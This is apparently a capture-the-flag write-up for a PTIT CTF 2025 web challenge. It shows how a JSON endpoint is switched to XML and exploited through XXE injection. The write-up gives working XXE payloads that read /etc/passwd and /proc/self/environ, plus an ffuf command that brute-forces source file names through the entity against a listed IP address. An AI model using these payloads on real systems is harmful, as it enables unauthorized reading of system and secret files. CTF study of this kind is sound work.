1. Visit the website

<img width="1920" height="1033" alt="image" src="https://github.com/user-attachments/assets/87ff5397-489d-4cc0-8bf0-b635a4e545f7" />  

* The request to send when choosing the answer is as follows:

<img width="1284" height="734" alt="image" src="https://github.com/user-attachments/assets/bf0e4515-5c0d-476f-afd4-9d9289cd9332" />  

2. Fuzzing
* Right click on the request and select do active scan

<img width="1534" height="977" alt="image" src="https://github.com/user-attachments/assets/63afcba4-d38b-4f59-b307-8146e78ee904" />  

* Looking at the logger area, we see that the application supports `content-type: application/xml`

<img width="1919" height="1058" alt="image" src="https://github.com/user-attachments/assets/69f512d3-215e-4e22-a74e-4ca02f003f41" />  

* From here we have one more vector to exploit related to xml which is XXE Injection

3. Convert request format from Json to XML

<img width="1203" height="878" alt="image" src="https://github.com/user-attachments/assets/6ee1200a-8b98-44cc-b52c-0fb02550aaad" />  

4. Read the file via XXE  
```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
    <question_text>PTIT CTF 2025</question_text>
    <answer>&xxe;</answer>
</root>
```

<img width="1522" height="882" alt="image" src="https://github.com/user-attachments/assets/642ee4e3-9e20-47dd-b529-75bf7e93c576" />  

5. Check the running process's environment variables at `/proc/self/environ`  
We don't know where the flag file is located, it needs to be recon.  
We can see if the flag is stored in the environment variable of the running flask process, by reading the file: `/proc/self/environ`  

<img width="1532" height="870" alt="image" src="https://github.com/user-attachments/assets/c9a38fe1-cd4e-43f6-9bfa-2739d496dce1" />  

⇒ We see a syntax error for the output containing non-alphabetic bytes.  

6. Use wordlist to find files in source code  
We also know that the path `/proc/self/cwd/` will contain the source code of the current process  
But because we don't know the file names, we need to fuzz based on the wordlist using the FUFF tool
```
ffuf -u "http://103.197.184.163:5004/submit_answer" -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/cwd/FUZZ"> ]>
<root>
    <question_text>PTIT CTF 2025</question_text>
    <answer>&xxe;</answer>
</root>
' -w wordlists/dirsearch.txt -fr "None"
```
* The `-fr` option allows to ignore return responses containing the word None

<img width="1146" height="757" alt="image" src="https://github.com/user-attachments/assets/2c3649c9-5aaa-41c6-8828-9f4222e3410a" />  

⇒ The result is a number of files like:  
  * %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  
  * ../../../../../../etc/passwd  
  * dockerfile  
  * requirements.txt

The dockerfile file defines how a service will operate, most likely flags will also be defined in this file  
**Read dockerfile**  

<img width="1463" height="708" alt="image" src="https://github.com/user-attachments/assets/120e98a5-2ab6-4397-9c26-dd45f520a38d" />

FROM THE [SOURCE](https://nguyengiangnam.notion.site/WU-PTITCTF-2025-260091b6851e807babfdcce2bba84411)







